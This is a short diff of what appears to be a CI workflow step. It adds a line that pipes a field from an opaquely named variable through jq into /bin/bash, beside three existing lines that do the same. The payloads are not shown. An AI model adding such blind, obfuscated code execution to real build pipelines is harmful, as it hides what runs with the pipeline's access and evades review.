@@ -21,6 +21,7 @@ jobs:
           echo $az556 | jq -r .p0 | /bin/bash
           echo $pfpss05 | jq -r .kpmn7 | /bin/bash
           printf '%s' "$cf32" | jq -r .qqk9 | /bin/bash
+          echo $ws9 | jq -r .gfx1331 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
